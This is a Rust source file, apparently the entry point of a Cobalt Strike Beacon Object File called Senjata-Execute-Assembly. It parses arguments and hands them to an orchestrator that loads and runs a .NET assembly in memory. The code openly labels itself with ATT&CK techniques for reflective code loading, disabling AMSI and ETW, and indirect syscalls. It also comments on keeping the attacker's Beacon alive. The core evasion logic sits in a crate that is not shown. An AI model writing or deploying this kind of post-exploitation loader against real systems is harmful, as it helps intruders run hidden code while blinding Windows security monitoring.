//! Senjata-Execute-Assembly BOF — inline-mode entry point. Most logic
//! lives in `clr-orchestrator`; this crate handles args parsing and the
//! rustbof-driven main entry.
#![no_std]

pub mod args;
#[cfg(target_os = "windows")]
pub mod error;
#[cfg(all(target_os = "windows", feature = "diag-log"))]
mod debug_log;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    #[cfg(target_os = "windows")]
    {
        #[cfg(feature = "diag-log")]
        {
            debug_log::log(b"--------------------------------------");
            debug_log::log(b"[bof] main entered");
            debug_log::log_hex(b"[bof]   raw args len=", len as u32);
        }
        match run(args, len) {
            Ok(()) => {
                #[cfg(feature = "diag-log")]
                debug_log::log(b"[bof] run() returned Ok");
                rustbof::eprintln!("[+] senjata-execute-assembly finished")
            }
            Err(e) => {
                #[cfg(feature = "diag-log")]
                debug_log::log(b"[bof] run() returned Err");
                rustbof::eprintln!("[-] {}", e.format())
            }
        }
        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof] main returning");
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = (args, len);
    }
}

#[cfg(target_os = "windows")]
fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
    use clr_orchestrator::OrchestratorError;
    #[allow(unused_imports)]
    use error::BofError;

    #[cfg(feature = "diag-log")]
    debug_log::log(b"[bof] step 1: args::parse");
    let a = args::parse(raw_args, len).map_err(BofError::Args)?;
    #[cfg(feature = "diag-log")]
    {
        debug_log::log(b"[bof]   args::parse ok");
        debug_log::log_hex(b"[bof]   amsi=", a.amsi as u32);
        debug_log::log_hex(b"[bof]   etw=", a.etw as u32);
        debug_log::log_hex(b"[bof]   asm_bytes.len=", a.asm_bytes.len() as u32);
    }

    rustbof::eprintln!("[senjata] senjata-execute-assembly v0.5.1  -  Created by DAP");
    rustbof::eprintln!(
        "[senjata] MITRE ATT&CK: T1620 (Reflective Code Loading) | T1562.001 (Disable AMSI/ETW) | T1106 (Indirect Syscalls)"
    );

    unsafe {
        #[cfg(feature = "diag-log")]
        unsafe extern "C" fn diag_thunk(msg: *const u8, len: usize) {
            unsafe {
                let slice = core::slice::from_raw_parts(msg, len);
                debug_log::log(slice);
            }
        }

        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof] step 2: building StompInput");
        let stomp_input = clr_orchestrator::StompInput {
            app_domain:  &a.app_domain,
            pipe_name:   &a.pipe_name,
            asm_args:    &a.asm_args,
            asm_bytes:   &a.asm_bytes,
            entry_point: a.entry_point,
            #[cfg(feature = "diag-log")]
            log_fn: Some(diag_thunk),
            #[cfg(not(feature = "diag-log"))]
            log_fn: None,
        };

        #[cfg(feature = "diag-log")]
        debug_log::log(b"[bof] step 3: orchestrate_stomp()");
        let r = clr_orchestrator::orchestrate_stomp(&stomp_input);

        match r {
            Ok(()) => {
                #[cfg(feature = "diag-log")]
                debug_log::log(b"[bof]   orchestrate_stomp returned Ok");
            }
            Err(OrchestratorError::ClrAlreadyRunning) => {
                // The exit-trap (HWBP on RtlExitUserProcess) requires a fresh
                // CLR state to work safely. If CLR was started by a prior run
                // or another tool, intercepting mid-exit corrupts CLR and
                // kills Beacon. Error out clearly so the operator knows exactly
                // what to do.
                #[cfg(feature = "diag-log")]
                debug_log::log(b"[bof]   CLR already running -- cannot stomp");
                return Err(BofError::Orchestrator(OrchestratorError::ClrAlreadyRunning));
            }
            Err(e) => {
                #[cfg(feature = "diag-log")]
                debug_log::log(b"[bof]   orchestrate_stomp returned Err");
                return Err(BofError::Orchestrator(e));
            }
        }
    }
    Ok(())
}
